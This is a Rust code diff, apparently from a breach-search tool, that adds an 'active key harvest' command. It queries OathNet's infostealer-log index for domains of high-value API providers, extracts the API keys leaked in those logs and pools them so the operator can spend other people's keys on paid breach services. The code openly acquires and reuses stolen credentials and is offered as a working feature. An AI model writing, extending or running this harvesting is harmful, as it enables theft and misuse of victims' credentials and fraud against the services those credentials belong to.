@@ -373,6 +373,110 @@ pub fn extract_api_keys_from_item(
     }
 }
 
+// ── Active key harvest ─────────────────────────────────────────────────────
+//
+// Passive harvest (above) only sees keys that happen to appear in a *target's*
+// own breach/stealer rows. Active harvest deliberately queries OathNet's stealer
+// index for high-value API-provider domains, pulling keys leaked in stealer logs
+// regardless of the scan target — the operator-invoked credential-acquisition
+// sweep (`hse keys harvest`). It scales the operator's own quota: harvesting more
+// OathNet / see_know / dehashed keys grows the breach-API pools the whole engine
+// draws on.
+
+/// Default cap on service domains queried per active harvest. The quota guard
+/// that kept the pre-scan harvest from burning dozens of calls; the operator can
+/// raise it explicitly.
+pub const DEFAULT_HARVEST_LIMIT: usize = 12;
+
+/// Outcome of an active key-harvest sweep.
+#[derive(Debug, Default, Clone)]
+pub struct HarvestReport {
+    /// Service domains actually queried (bounded by the limit and the budget).
+    pub domains_queried: usize,
+    /// Total API keys discovered and pooled.
+    pub keys_found: usize,
+    /// Keys discovered, broken down by service.
+    pub by_service: std::collections::BTreeMap<String, usize>,
+}
+
+/// Choose which service domains to query, in priority order: ONE canonical
+/// domain per **poolable** service (a key we can't pool isn't worth a paid
+/// query), deduped by service, capped at `limit`. Self-scaling breach providers
+/// (oathnet/see_know/dehashed/…) lead the table, so they are harvested first.
+/// Pure and order-deterministic.
+pub(crate) fn harvest_targets(limit: usize) -> Vec<(&'static str, &'static str)> {
+    let mut seen: HashSet<&'static str> = HashSet::new();
+    let mut out: Vec<(&'static str, &'static str)> = Vec::new();
+    for (domain, svc) in service_domains::API_SERVICE_DOMAINS {
+        if out.len() >= limit {
+            break; // cap reached (also makes limit == 0 yield nothing)
+        }
+        if !crate::util::service_defs::is_poolable_service(svc) {
+            continue; // can't pool it → harvesting its key wastes a query
+        }
+        if seen.insert(svc) {
+            out.push((domain, svc));
+        }
+    }
+    out
+}
+
+/// Tally any `ApiKey` entities appended to `result` since index `from` into the
+/// report (counting total and per-service via the `service:<name>` tag). Pure.
+fn tally_harvested(result: &ModuleResult, from: usize, report: &mut HarvestReport) {
+    for e in &result.entities[from..] {
+        if e.kind != EntityKind::ApiKey {
+            continue;
+        }
+        report.keys_found += 1;
+        if let Some(svc) = e.tags.iter().find_map(|t| t.strip_prefix("service:")) {
+            *report.by_service.entry(svc.to_string()).or_insert(0) += 1;
+        }
+    }
+}
+
+/// Actively harvest API keys from OathNet stealer logs.
+///
+/// Queries the stealer index by login URL for each high-value provider domain
+/// ([`harvest_targets`]), then runs every result through the shared
+/// [`extract_api_keys_from_item`] pipeline — so discovered keys are emitted as
+/// `ApiKey` entities AND pooled for reuse. Respects the OathNet budget: the
+/// underlying [`crate::util::oathnet::search`] returns empty once the per-scan or
+/// daily quota is exhausted, so the sweep simply stops paying. Returns the report
+/// plus the harvested entities (callers persist the pool via the emit path).
+pub async fn harvest_keys(
+    oathnet_key: &str,
+    limit: usize,
+    scan_id: &str,
+) -> (HarvestReport, ModuleResult) {
+    let mut report = HarvestReport::default();
+    let mut result = ModuleResult::new();
+    let mut seen: HashSet<String> = HashSet::new();
+
+    for (domain, _svc) in harvest_targets(limit) {
+        report.domains_queried += 1;
+        let items = match crate::util::oathnet::search(
+            oathnet_key,
+            crate::util::oathnet::paths::STEALER,
+            "url",
+            domain,
+            100,
+        )
+        .await
+        {
+            Ok(items) => items,
+            Err(_) => continue,
+        };
+        for item in &items {
+            store_api_credential(item);
+            let before = result.entities.len();
+            extract_api_keys_from_item(item, scan_id, &mut seen, &mut result);
+            tally_harvested(&result, before, &mut report);
+        }
+    }
+    (report, result)
+}
+
 // ── False-positive filtering (APIKeyScanner port) ──────────────────────
 //
 // Three independent gates a candidate string must pass before
